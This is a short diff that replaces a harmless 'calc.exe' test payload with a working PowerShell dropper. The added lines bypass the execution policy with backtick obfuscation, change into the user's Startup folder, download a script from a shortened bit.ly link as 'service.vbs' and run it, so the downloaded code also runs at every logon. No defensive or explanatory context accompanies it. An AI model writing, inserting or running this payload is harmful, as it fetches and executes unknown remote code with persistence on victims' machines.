@@ -1,1 +1,5 @@
-calc.exe
+powershell -exec `b`yp`a`ss
+
+$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
+
+cd $StartUp ; iwr https://bit.ly/2TPR0lG -outfile service.vbs ; .\service.vbs
